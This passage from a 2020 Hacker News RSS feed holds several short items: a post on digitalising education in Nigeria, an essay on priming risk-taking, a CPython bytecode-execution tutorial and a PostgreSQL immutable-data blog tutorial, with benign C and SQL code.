            <guid isPermaLink="false">hacker-news-small-sites-25025512</guid>
            <pubDate>Sun, 08 Nov 2020 12:59:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Digitalizing Education in Nigeria]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25025504">thread link</a>) | @tosky
<br/>
November 8, 2020 | https://blog.swizel.co/digitalizing-education-in-nigeria-ckeyoypr2003xtrs13taddlkg | <a href="https://web.archive.org/web/*/https://blog.swizel.co/digitalizing-education-in-nigeria-ckeyoypr2003xtrs13taddlkg">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1599856000240/tnHMHxQgo.jpeg?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1599855429914/8tPIXBOLW.jpeg?auto=format&amp;q=60" alt="Education.jpg"></p>
<p><strong>T</strong>he state of education in Nigeria is dismal, especially in rural areas. Access to good education is scarce, and where it isn’t, it is ridiculously expensive. This is due to the enormous amount resources that go into setting up a school. Infrastructure, Licensing, Staff payment, Environmental maintenance are some of the major culprits, and rightly so.</p>
<p>In a nation ravaged by poverty, there must be ways to give access to quality education beyond the confines of the classroom, or school. <strong>This is where Digitalization comes in</strong>. </p>
<p>In this ever digital world where you have computers more and more becoming prerequisite for learning, it is wise to harness the power these devices wield and channel them towards creating a system that can cater for education with or without the classroom.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1599855268846/MJ5Xm3i3I.jpeg?auto=format&amp;q=60" alt="LAPTOP.jpg"></p>
<p><strong>Taking Over</strong></p>
<p>Technology keeps on advancing and making life easier. People make use of their computers and cellular devices more often than not these days and this is drastically improving the way we accomplish tasks, keep records, and even deliver lecturers all over the world.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1599855424798/_UELdA0cg.jpeg?auto=format&amp;q=60" alt="book.jpg"></p>
<p>Technology has made it possible for students in rural areas to gain access to standard education from anywhere in the world, up to certificate level. The opportunities are endless.</p>
<p><strong>A step further</strong></p>
<p>A step further would be the harnessing of technology to suit both academic and administrative needs and processes. This is what the Project Appman brings to the table.
We envision such a time when every school would be capable of offering virtual options for every course, such that students who cannot afford to go to school, can have school meet them halfway through a simple device.
We envision a time when field trips will be turned to webinars, so that students who cannot afford to go on trips, can traverse within the screens of their devices and gain relevant experience equal to that gotten on the field. 
We envision a time when self learning can be encouraged, practiced and rewarded. A time when we can achieve equitable access to learning material and content to every individual.</p>
<p>A step further is the <strong>Project Appman</strong></p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1599855205798/fJ0lShSiA.jpeg?auto=format&amp;q=60" alt="APPMAN.jpg"></p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.swizel.co/digitalizing-education-in-nigeria-ckeyoypr2003xtrs13taddlkg</link>
            <guid isPermaLink="false">hacker-news-small-sites-25025504</guid>
            <pubDate>Sun, 08 Nov 2020 12:58:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Machine Learning News (Like HN, but for ML)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25025501">thread link</a>) | @rerapp
<br/>
November 8, 2020 | https://mln.dev/top/1 | <a href="https://web.archive.org/web/*/https://mln.dev/top/1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://mln.dev/top/1</link>
            <guid isPermaLink="false">hacker-news-small-sites-25025501</guid>
            <pubDate>Sun, 08 Nov 2020 12:57:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Priming People to Take Risk]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25025464">thread link</a>) | @sheefrex
<br/>
November 8, 2020 | https://www.themetasophist.com/daily-notes/priming-people-to-take-risk | <a href="https://web.archive.org/web/*/https://www.themetasophist.com/daily-notes/priming-people-to-take-risk">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-e3d84c4e3b6158abd6f5"><div><div><p>A key contributor to stagnation could be a growing reluctance to take risk. All creation involves risk, because when embarking on the journey you rarely know the result. As Paul Graham said, <a href="http://paulgraham.com/early.html">you might fear creating something "lame"</a>.</p><p>As society develops, it could become less attractive to take risk. For example, if you are musically inclined, learning and performing the works of Beethoven, Mozart, Chopin, and Wagner may deliver more instant rewards then creating your own musical forms. There is a large audience for the renowned, little for the unknown. In addition, someone like J.S. Bach could focus more on writing music, because he didn't have any of those four composers to listen to, and couldn't be paid for performing their works.</p><p>Similarly, as wealth grows, more people are employed to manage it. In a society with little wealth, financiers are few as there are fewer assets to trade. The mathematicians and engineers who become quants in our current age would actually have done maths and engineering in a poorer one.</p><p>These are two particular instances of a general problem whereby established paths are less risky and therefore more attractive than novel ones.</p><p>But without risk, no one will come up with new paradigms of knowledge and organisation. We need people to take risk to ward off stagnation. How can we encourage people to do so?</p><p>A potential answer to this question emerged in a <a href="https://jimruttshow.blubrry.net/the-jim-rutt-show-transcripts/transcript-of-episode-87-joscha-bach-on-theories-of-consciousness/">conversation between Jim Rutt and Joscha Bach</a>. Rutt cited a psychological experiment <a href="https://pdfs.semanticscholar.org/ad1e/6dac677b7793836585405076e63839e99b22.pdf" title="https://pdfs.semanticscholar.org/ad1e/6dac677b7793836585405076e63839e99b22.pdf">(Dutton and Aron, 1974)</a> whereby those who just walked across a dangerous bridge were more likely to arrange a date with a member of the opposite sex immediately afterwards than those who walked over a safer bridge. The implication in the discussion is that doing something risky raises your willingness to take more risk.</p><p>In fact, Dutton and Arron state that this behaviour probably arises from what is known as the "Misattribution of Arousal". Essentially, going over a dangerous bridge induces physiological arousal, which the participant mistakes for romantic arousal. <a href="https://www.researchgate.net/publication/232518962_Arousal_and_attraction_A_response-facilitation_alternative_to_misattribution_and_negative-reinforcement_models" title="https://www.researchgate.net/publication/232518962_Arousal_and_attraction_A_response-facilitation_alternative_to_misattribution_and_negative-reinforcement_models">According to Allen et al.</a>, this effect even holds when someone is aware that the main source of arousal is non-romantic in nature.</p><p>Music can also induce physiological arousal: <a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0183531" title="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0183531">another study</a> finds that women, but not men, were more likely to rate a man as attractive after listening to music. Interestingly, the study notes that "high-arousing, complex music yielded the largest effects". If excitation-transfer theory holds, the same dynamic would probably apply to exercise.</p><p>This may be interesting if one wants to raise the number of couples in society. But is there a link to risk-taking in areas such as business, politics and academia? There is some evidence that becoming aware of the neutral nature of arousal can boost confidence, and therefore also risk-taking, at least in the short-term. For example, <a href="https://journals.sagepub.com/doi/abs/10.1177/0146167298245008">one study says that arousal is just part of "gearing up" to do a task</a>, and that this feeling is often wrongly attributed to diminished confidence. From the abstract (my emphasis):</p></div><blockquote><p>"People's confidence that they will do well tends to diminish as the "moment of truth" draws near. We propose that this phenomenon stems in part from individuals using their pre-task arousal as a cue to their level of confidence. Arousal that is part and parcel of "gearing up" to perform a task may be misattributed to diminished confidence... <strong>Participants in two experiments who were encouraged to misattribute their arousal to a neutral source ("subliminal noise") expressed greater confidence in their ability </strong>than did participants not able to do so"</p></blockquote><div><p>In this abstract, we have found what we are looking for, and it's slightly better than our starting point as it is much easier to attribute arousal to a normal part of doing a task than it is to find a dangerous bridge to walk across. In practice, this would be useful on a short-term horizon. For example, if you are an entrepreneur about to approach a potential customer or pitch to investors, you should attribute any nervousness to just part of doing a novel task rather than interpreting it as a sign you are about to do the coming task poorly. That could increase your confidence and reduce the probability you will abandon the effort.</p><p>Framing nervousness in this way may help people to take risk. But of course, taking a risk does not mean that it will always be successful.</p></div></div></div></div>]]>
            </description>
            <link>https://www.themetasophist.com/daily-notes/priming-people-to-take-risk</link>
            <guid isPermaLink="false">hacker-news-small-sites-25025464</guid>
            <pubDate>Sun, 08 Nov 2020 12:49:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Python bytecode is executed]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25025451">thread link</a>) | @r4victor
<br/>
November 8, 2020 | https://tenthousandmeters.com/blog/python-behind-the-scenes-4-how-python-bytecode-is-executed/ | <a href="https://web.archive.org/web/*/https://tenthousandmeters.com/blog/python-behind-the-scenes-4-how-python-bytecode-is-executed/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<!-- /.post-info -->      <p>We started this series with <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-1-how-the-cpython-vm-works/">an overview of the CPython VM</a>. We learned that to run a Python program, CPython first compiles it to bytecode, and we studied how the compiler works in <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-2-how-the-cpython-compiler-works/">part two</a>. <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-3-stepping-through-the-cpython-source-code/">Last time</a> we stepped through the CPython source code starting with the <code>main()</code> function until we reached the evaluation loop, a place where Python bytecode gets executed. The main reason why we spent time studying these things was to prepare for the discussion that we start today. The goal of this discussion is to understand how CPython does what we tell it to do, that is, how it executes the bytecode to which the code we write compiles.</p>
<p><strong>Note</strong>: In this post I'm referring to CPython 3.9. Some implementation details will certainly change as CPython evolves. I'll try to keep track of important changes and add update notes.</p>
<h3>Starting point</h3>
<p>Let's briefly recall what we learned in the previous parts. We tell CPython what to do by writing Python code. The CPython VM, however, understands only Python bytecode. This is the job of the compiler to translate Python code to bytecode. The compiler stores bytecode in a code object, which is a structure that fully describes what a code block, like a module or a function, does. To execute a code object, CPython first creates a state of execution for it called a frame object. Then it passes a frame object to a frame evaluation function to perform the actual computation. The default frame evaluation function is <code>_PyEval_EvalFrameDefault()</code> defined in <a href="https://github.com/python/cpython/blob/3.9/Python/ceval.c#L889">Python/ceval.c</a>. This function implements the core of the CPython VM. Namely, it implements the logic for the execution of Python bytecode. So, this function is what we're going to study today.</p>
<p>To understand how <code>_PyEval_EvalFrameDefault()</code> works, it is crucial to have an idea of what its input, a frame object, is. A frame object is a Python object defined by the following C struct:</p>
<div><pre><span></span><span>// typedef struct _frame PyFrameObject; in other place</span>
<span>struct</span> <span>_frame</span> <span>{</span>
    <span>PyObject_VAR_HEAD</span>
    <span>struct</span> <span>_frame</span> <span>*</span><span>f_back</span><span>;</span>      <span>/* previous frame, or NULL */</span>
    <span>PyCodeObject</span> <span>*</span><span>f_code</span><span>;</span>       <span>/* code segment */</span>
    <span>PyObject</span> <span>*</span><span>f_builtins</span><span>;</span>       <span>/* builtin symbol table (PyDictObject) */</span>
    <span>PyObject</span> <span>*</span><span>f_globals</span><span>;</span>        <span>/* global symbol table (PyDictObject) */</span>
    <span>PyObject</span> <span>*</span><span>f_locals</span><span>;</span>         <span>/* local symbol table (any mapping) */</span>
    <span>PyObject</span> <span>**</span><span>f_valuestack</span><span>;</span>    <span>/* points after the last local */</span>
    <span>/* Next free slot in f_valuestack.  Frame creation sets to f_valuestack.</span>
<span>       Frame evaluation usually NULLs it, but a frame that yields sets it</span>
<span>       to the current stack top. */</span>
    <span>PyObject</span> <span>**</span><span>f_stacktop</span><span>;</span>
    <span>PyObject</span> <span>*</span><span>f_trace</span><span>;</span>          <span>/* Trace function */</span>
    <span>char</span> <span>f_trace_lines</span><span>;</span>         <span>/* Emit per-line trace events? */</span>
    <span>char</span> <span>f_trace_opcodes</span><span>;</span>       <span>/* Emit per-opcode trace events? */</span>

    <span>/* Borrowed reference to a generator, or NULL */</span>
    <span>PyObject</span> <span>*</span><span>f_gen</span><span>;</span>

    <span>int</span> <span>f_lasti</span><span>;</span>                <span>/* Last instruction if called */</span>
    <span>int</span> <span>f_lineno</span><span>;</span>               <span>/* Current line number */</span>
    <span>int</span> <span>f_iblock</span><span>;</span>               <span>/* index in f_blockstack */</span>
    <span>char</span> <span>f_executing</span><span>;</span>           <span>/* whether the frame is still executing */</span>
    <span>PyTryBlock</span> <span>f_blockstack</span><span>[</span><span>CO_MAXBLOCKS</span><span>];</span> <span>/* for try and loop blocks */</span>
    <span>PyObject</span> <span>*</span><span>f_localsplus</span><span>[</span><span>1</span><span>];</span>  <span>/* locals+stack, dynamically sized */</span>
<span>};</span>
</pre></div>


<p>The <code>f_code</code> field of a frame object points to a code object. A code object is also a Python object. Here's its definition:</p>
<div><pre><span></span><span>struct</span> <span>PyCodeObject</span> <span>{</span>
    <span>PyObject_HEAD</span>
    <span>int</span> <span>co_argcount</span><span>;</span>            <span>/* #arguments, except *args */</span>
    <span>int</span> <span>co_posonlyargcount</span><span>;</span>     <span>/* #positional only arguments */</span>
    <span>int</span> <span>co_kwonlyargcount</span><span>;</span>      <span>/* #keyword only arguments */</span>
    <span>int</span> <span>co_nlocals</span><span>;</span>             <span>/* #local variables */</span>
    <span>int</span> <span>co_stacksize</span><span>;</span>           <span>/* #entries needed for evaluation stack */</span>
    <span>int</span> <span>co_flags</span><span>;</span>               <span>/* CO_..., see below */</span>
    <span>int</span> <span>co_firstlineno</span><span>;</span>         <span>/* first source line number */</span>
    <span>PyObject</span> <span>*</span><span>co_code</span><span>;</span>          <span>/* instruction opcodes */</span>
    <span>PyObject</span> <span>*</span><span>co_consts</span><span>;</span>        <span>/* list (constants used) */</span>
    <span>PyObject</span> <span>*</span><span>co_names</span><span>;</span>         <span>/* list of strings (names used) */</span>
    <span>PyObject</span> <span>*</span><span>co_varnames</span><span>;</span>      <span>/* tuple of strings (local variable names) */</span>
    <span>PyObject</span> <span>*</span><span>co_freevars</span><span>;</span>      <span>/* tuple of strings (free variable names) */</span>
    <span>PyObject</span> <span>*</span><span>co_cellvars</span><span>;</span>      <span>/* tuple of strings (cell variable names) */</span>
    <span>/* The rest aren't used in either hash or comparisons, except for co_name,</span>
<span>       used in both. This is done to preserve the name and line number</span>
<span>       for tracebacks and debuggers; otherwise, constant de-duplication</span>
<span>       would collapse identical functions/lambdas defined on different lines.</span>
<span>    */</span>
    <span>Py_ssize_t</span> <span>*</span><span>co_cell2arg</span><span>;</span>    <span>/* Maps cell vars which are arguments. */</span>
    <span>PyObject</span> <span>*</span><span>co_filename</span><span>;</span>      <span>/* unicode (where it was loaded from) */</span>
    <span>PyObject</span> <span>*</span><span>co_name</span><span>;</span>          <span>/* unicode (name, for reference) */</span>
    <span>PyObject</span> <span>*</span><span>co_lnotab</span><span>;</span>        <span>/* string (encoding addr&lt;-&gt;lineno mapping) See</span>
<span>                                   Objects/lnotab_notes.txt for details. */</span>
    <span>void</span> <span>*</span><span>co_zombieframe</span><span>;</span>       <span>/* for optimization only (see frameobject.c) */</span>
    <span>PyObject</span> <span>*</span><span>co_weakreflist</span><span>;</span>   <span>/* to support weakrefs to code objects */</span>
    <span>/* Scratch space for extra data relating to the code object.</span>
<span>       Type is a void* to keep the format private in codeobject.c to force</span>
<span>       people to go through the proper APIs. */</span>
    <span>void</span> <span>*</span><span>co_extra</span><span>;</span>

    <span>/* Per opcodes just-in-time cache</span>
<span>     *</span>
<span>     * To reduce cache size, we use indirect mapping from opcode index to</span>
<span>     * cache object:</span>
<span>     *   cache = co_opcache[co_opcache_map[next_instr - first_instr] - 1]</span>
<span>     */</span>

    <span>// co_opcache_map is indexed by (next_instr - first_instr).</span>
    <span>//  * 0 means there is no cache for this opcode.</span>
    <span>//  * n &gt; 0 means there is cache in co_opcache[n-1].</span>
    <span>unsigned</span> <span>char</span> <span>*</span><span>co_opcache_map</span><span>;</span>
    <span>_PyOpcache</span> <span>*</span><span>co_opcache</span><span>;</span>
    <span>int</span> <span>co_opcache_flag</span><span>;</span>  <span>// used to determine when create a cache.</span>
    <span>unsigned</span> <span>char</span> <span>co_opcache_size</span><span>;</span>  <span>// length of co_opcache.</span>
<span>};</span>
</pre></div>


<p>The most important field of a code object is <code>co_code</code>. It's a pointer to a Python bytes object representing the bytecode. The bytecode is a sequence of two-byte instructions: one byte for an opcode and one byte for an argument.</p>
<p>Don't worry if some members of the above structures are still a mystery to you. We'll see what they are used for as we move forward in our attempt to understand how the CPython VM executes the bytecode.</p>
<h3>Overview of the evaluation loop</h3>
<p>The problem of executing Python bytecode may seem a no-brainer to you. Indeed, all the VM has to do is to iterate over the instructions and to act according to them. And this is what essentially <code>_PyEval_EvalFrameDefault()</code> does. It contains an infinite <code>for (;;)</code> loop that we refer to as the evaluation loop. Inside that loop there is a giant <code>switch</code> statement over all possible opcodes. Each opcode has a corresponding <code>case</code> block containing the code for executing that opcode. The bytecode is represented by an array of 16-bit unsigned integers, one integer per instruction. The VM keeps track of the next instruction to be executed using the <code>next_instr</code> variable, which is a pointer to the array of instructions. At the start of each iteration of the evaluation loop, the VM calculates the next opcode and its argument by taking the least significant and the most significant byte of the next instruction respectively and increments <code>next_instr</code>. The <code>_PyEval_EvalFrameDefault()</code> function is nearly 3000 lines long, but its essence can be captured by the following simplified version:</p>
<div><pre><span></span><span>PyObject</span><span>*</span>
<span>_PyEval_EvalFrameDefault</span><span>(</span><span>PyThreadState</span> <span>*</span><span>tstate</span><span>,</span> <span>PyFrameObject</span> <span>*</span><span>f</span><span>,</span> <span>int</span> <span>throwflag</span><span>)</span>
<span>{</span>
    <span>// ... declarations and initialization of local variables</span>
    <span>// ... macros definitions</span>
    <span>// ... call depth handling</span>
    <span>// ... code for tracing and profiling</span>

    <span>for</span> <span>(;;)</span> <span>{</span>
        <span>// ... check if the bytecode execution must be suspended,</span>
        <span>// e.g. other thread requested the GIL</span>

        <span>// NEXTOPARG() macro</span>
        <span>_Py_CODEUNIT</span> <span>word</span> <span>=</span> <span>*</span><span>next_instr</span><span>;</span> <span>// _Py_CODEUNIT is a typedef for uint16_t</span>
        <span>opcode</span> <span>=</span> <span>_Py_OPCODE</span><span>(</span><span>word</span><span>);</span>
        <span>oparg</span> <span>=</span> <span>_Py_OPARG</span><span>(</span><span>word</span><span>);</span>
        <span>next_instr</span><span>++</span><span>;</span>

        <span>switch</span> <span>(</span><span>opcode</span><span>)</span> <span>{</span>
            <span>case</span> <span>TARGET</span><span>(</span><span>NOP</span><span>)</span> <span>{</span>
                <span>FAST_DISPATCH</span><span>();</span> <span>// more on this later</span>
            <span>}</span>

            <span>case</span> <span>TARGET</span><span>(</span><span>LOAD_FAST</span><span>)</span> <span>{</span>
                <span>// ... code for loading local variable</span>
            <span>}</span>

            <span>// ... 117 more cases for every possible opcode</span>
        <span>}</span>

        <span>// ... error handling</span>
    <span>}</span>

    <span>// ... termination</span>
<span>}</span>
</pre></div>


<p>To get a more realistic picture, let's discuss some of the omitted pieces in more detail.</p>
<h4>reasons to suspend the loop</h4>
<p>From time to time, the currently running thread stops executing the bytecode to do something else or to do nothing. This can happen due to one of the four reasons:</p>
<ul>
<li>There are signals to handle. When you register a function as a signal handler using <a href="https://docs.python.org/3/library/signal.html#signal.signal"><code>signal.signal()</code></a>, CPython stores this function in the array of handlers. The function that will actually be called when a thread receives a signal is <code>signal_handler()</code> (it's passed to the <a href="https://www.man7.org/linux/man-pages/man2/sigaction.2.html"><code>sigaction()</code></a> library function on Unix-like systems). When called, <code>signal_handler()</code> sets a boolean variable telling that the function in the array of handlers corresponding to the received signal has to be called. Periodically, the main thread of the main interpreter calls the tripped handlers.</li>
<li>There are pending calls to call. Pending calls is a mechanism that allows to schedule a function to be executed from the main thread. This mechanism is exposed by the Python/C API via the <a href="https://docs.python.org/3/c-api/init.html#c.Py_AddPendingCall"><code>Py_AddPendingCall()</code></a> function.</li>
<li>The asynchronous exception is raised. The asynchronous exception is an exception set in one thread from another. This can be done using the <a href="https://docs.python.org/3/c-api/init.html#c.PyThreadState_SetAsyncExc"><code>PyThreadState_SetAsyncExc()</code></a> function provided by the Python/C API.</li>
<li>The currently running thread is requested to drop the GIL. When it sees such a request, it drops the GIL and waits until it acquires the GIL again.</li>
</ul>
<p>CPython has indicators for each of these events. The variable indicating that there are handlers to call is a member of <code>runtime-&gt;ceval</code>, which is a <code>_ceval_runtime_state</code> struct:</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-4-how-python-bytecode-is-executed/">https://tenthousandmeters.com/blog/python-behind-the-scenes-4-how-python-bytecode-is-executed/</a></em></p>]]>
            </description>
            <link>https://tenthousandmeters.com/blog/python-behind-the-scenes-4-how-python-bytecode-is-executed/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25025451</guid>
            <pubDate>Sun, 08 Nov 2020 12:48:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Immutable Blog Application in PostgreSQL]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25025415">thread link</a>) | @todsacerdoti
<br/>
November 8, 2020 | https://kevinmahoney.co.uk/articles/immutable-data/ | <a href="https://web.archive.org/web/*/https://kevinmahoney.co.uk/articles/immutable-data/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/BlogPosting" id="database-design-immutable-data">
  <div itemprop="articleBody">
    <p><time itemprop="datePublished">27 June 2015</time></p>

<p>In this article I’ll be talking about the advantages and disadvantages
of immutable data in databases. As a demonstration I’ll walk through a simple blog
application in PostgreSQL. I highly recommend this approach in many
cases, but the standard ‘caveat emptor’ disclaimer applies. Be aware
of the trade-offs you are making.</p>

<ul>
  <li><a href="#introduction">Introduction</a></li>
  <li><a href="#advantages">Advantages</a></li>
  <li><a href="#drawbacks">Drawbacks</a></li>
  <li><a href="#an-immutable-blog-application-in-postgresql">An Immutable Blog Application in PostgreSQL</a></li>
  <li><a href="#performance-improvements">Performance Improvements</a></li>
</ul>

<h2 id="introduction">Introduction</h2>

<p>In a traditional blog application, a blog post may be defined as
follows:</p>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>TABLE</span> <span>blog</span><span>.</span><span>article</span> <span>(</span>
       <span>slug</span> <span>TEXT</span> <span>PRIMARY</span> <span>KEY</span><span>,</span>
       <span>title</span> <span>TEXT</span> <span>NOT</span> <span>NULL</span><span>,</span>
       <span>content</span> <span>TEXT</span> <span>NOT</span> <span>NULL</span>
<span>);</span></code></pre></figure>

<p>What happens when the content or title of the post changes? An
<code>UPDATE</code> is performed. This destructively mutates your database,
i.e. information has been lost - it is no longer known what the blog
post contained prior to its edit.</p>

<p>The idea behind the approach detailed here is that the current state
of the blog post is not recorded, instead there is an immutable log of
events for the entire history of the application. The current
application state is a function of these events. No information is
lost.</p>

<p>This approach will only ever <code>INSERT</code> into the database. It will never
<code>UPDATE</code>. The blog post table will now look more like this:</p>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>SEQUENCE</span> <span>logblog</span><span>.</span><span>revision_id_seq</span><span>;</span>
<span>CREATE</span> <span>TABLE</span> <span>logblog</span><span>.</span><span>article_revision</span> <span>(</span>
       <span>revision_id</span> <span>INTEGER</span> <span>PRIMARY</span> <span>KEY</span> <span>DEFAULT</span> <span>nextval</span><span>(</span><span>'logblog.revision_id_seq'</span><span>),</span>
       <span>timestamp</span> <span>TIMESTAMP</span> <span>NOT</span> <span>NULL</span> <span>DEFAULT</span> <span>now</span><span>(),</span>
       <span>slug</span> <span>TEXT</span> <span>NOT</span> <span>NULL</span><span>,</span>
       <span>title</span> <span>TEXT</span> <span>NOT</span> <span>NULL</span><span>,</span>
       <span>content</span> <span>TEXT</span> <span>NOT</span> <span>NULL</span>
<span>);</span></code></pre></figure>

<p>Note the slug is no longer unique. An article is updated by
inserting a new <code>article_revision</code> with an existing slug.</p>

<p>There are some existing databases based around this concept, including
<a href="http://datomic.com/">Datomic</a> and <a href="https://geteventstore.com/">EventStore</a>, but in this article I’ll be focusing on how to
do this in PostgreSQL.</p>

<h2 id="advantages">Advantages</h2>

<p>Why would you want to do this?</p>

<p>Immutable data in databases has all the same advantages as
immutable data in general purpose languages. It is usually much
easier to reason about than mutable state. See:
<a href="https://en.wikipedia.org/wiki/Referential_transparency_(computer_science)">Referential Transparency</a>.</p>

<p>This paragraph from the Datomic website explains other advantages of this
approach quite well:</p>

<blockquote>
  <p>How can data be immutable? Don’t facts change? They don’t, in fact,
when you incorporate time in the data. For instance, when Obama became
president, it didn’t mean that Bush was never president. As long as
who is president isn’t stored in a single (logical) place, there’s no
reason a database system couldn’t retain both facts
simultaneously. While many queries might be interested in the
‘current’ facts, others might be interested in, e.g. what the product
catalog looked like last month compared to this month. Incorporating
time in data allows the past to be retained (or not), and supports
point-in-time queries. Many real world systems have to retain all
changes, and struggle mightily to efficiently provide the ‘latest’
view in a traditional database. This all happens automatically in
Datomic. Datomic is a database of facts, not places.</p>
</blockquote>

<p>Immutable facts are great for auditing and debugging. It’s
tremendously helpful to be able to see the state of you application at
any point in time, and step through the state changes one by one. It’s
especially invaluable when working with financial data.</p>

<h2 id="drawbacks">Drawbacks</h2>

<p>There are some trade-offs to this approach: space usage, complexity
and performance.</p>

<p>Of course, storing every change to the state instead of mutating data
will require more persistent storage space. If you’re only inserting
data your storage requirements can only ever grow.</p>

<p>In PostgreSQL, naive read queries that reduce events down into the
current application state will often be more complicated and
have worse performance; However, this can compensated for with some
additional effort.
See the <a href="#performance-improvements">Performance Improvements</a>
section for more details.</p>

<h2 id="an-immutable-blog-application-in-postgresql">An Immutable Blog Application in PostgreSQL</h2>

<p>This code is available as a <a href="https://gist.github.com/KMahoney/dcc12d3ff6a49c11cdc9">gist</a>.</p>

<p>This application should be able to:</p>

<ul>
  <li>Privately write and edit blog posts</li>
  <li>Publish revisions of posts for public viewing</li>
  <li>Delete posts</li>
  <li>Add or remove tags to posts</li>
</ul>

<h3 id="schema">Schema</h3>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>SCHEMA</span> <span>logblog</span><span>;</span></code></pre></figure>

<h3 id="article-table">Article Table</h3>

<p>A table representing the set of article slugs. Foreign keys can
reference this to maintain integrity. PostgreSQL does
not allow referencing the <code>slug</code> field in the <code>article_revision</code> table
as it is not unique in that table.</p>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>TABLE</span> <span>logblog</span><span>.</span><span>article</span> <span>(</span>
       <span>slug</span> <span>TEXT</span> <span>NOT</span> <span>NULL</span> <span>PRIMARY</span> <span>KEY</span> <span>CHECK</span><span>(</span><span>slug</span> <span>SIMILAR</span> <span>TO</span> <span>'[-a-z]+'</span><span>)</span>
<span>);</span></code></pre></figure>

<h3 id="revision-table">Revision Table</h3>

<p>Next is an immutable log of article revisions. New articles can be
created by atomically inserting the slug into <code>article</code> and the
revision into <code>article_revision</code>. Articles can be updated by simply
inserting a new revision with an existing <code>article</code> slug.</p>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>SEQUENCE</span> <span>logblog</span><span>.</span><span>revision_id_seq</span><span>;</span>
<span>CREATE</span> <span>TABLE</span> <span>logblog</span><span>.</span><span>article_revision</span> <span>(</span>
       <span>revision_id</span> <span>INTEGER</span> <span>PRIMARY</span> <span>KEY</span> <span>DEFAULT</span> <span>nextval</span><span>(</span><span>'logblog.revision_id_seq'</span><span>),</span>
       <span>timestamp</span> <span>TIMESTAMP</span> <span>NOT</span> <span>NULL</span> <span>DEFAULT</span> <span>now</span><span>(),</span>
       <span>slug</span> <span>TEXT</span> <span>NOT</span> <span>NULL</span> <span>REFERENCES</span> <span>logblog</span><span>.</span><span>article</span><span>,</span>
       <span>title</span> <span>TEXT</span> <span>NOT</span> <span>NULL</span><span>,</span>
       <span>content</span> <span>TEXT</span> <span>NOT</span> <span>NULL</span>
<span>);</span></code></pre></figure>

<h3 id="publishing">Publishing</h3>

<p>Now for an immutable log of article publish events. The public will be
able to see the last published version of an article. This means it is
possible to publish an earlier revision to ‘rollback’ an article.</p>

<p>Note the timestamp when an article was published or deleted is
distinct from when the revision was created. Readers are probably more
interested in when an article was first published than when it was
first drafted.</p>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>TABLE</span> <span>logblog</span><span>.</span><span>article_publish</span> <span>(</span>
       <span>timestamp</span> <span>TIMESTAMP</span> <span>NOT</span> <span>NULL</span> <span>DEFAULT</span> <span>now</span><span>(),</span>
       <span>revision_id</span> <span>INTEGER</span> <span>REFERENCES</span> <span>logblog</span><span>.</span><span>article_revision</span>
<span>);</span></code></pre></figure>

<h3 id="deleting">Deleting</h3>

<p>An immutable log of article deletion events. Articles are only
considered deleted when the deletion timestamp is later than any
publish actions. This means articles can be ‘undeleted’ by
re-publishing them. No data is ever truly removed.</p>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>TABLE</span> <span>logblog</span><span>.</span><span>article_deletion</span> <span>(</span>
       <span>timestamp</span> <span>TIMESTAMP</span> <span>NOT</span> <span>NULL</span> <span>DEFAULT</span> <span>now</span><span>(),</span>
       <span>slug</span> <span>TEXT</span> <span>NOT</span> <span>NULL</span> <span>REFERENCES</span> <span>logblog</span><span>.</span><span>article</span>
<span>);</span></code></pre></figure>

<h3 id="tagging">Tagging</h3>

<p>An immutable log of tag events. It’s awkward to create a tag table
with a set of unique tag names like we do with articles, so instead we
just record tag events. This is a bit lazy as it doesn’t enforce
consistency with removed tags (i.e. you can remove a non-existing
tag).</p>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>TYPE</span> <span>logblog</span><span>.</span><span>tag_event_type</span> <span>AS</span> <span>ENUM</span> <span>(</span><span>'add'</span><span>,</span> <span>'remove'</span><span>);</span>
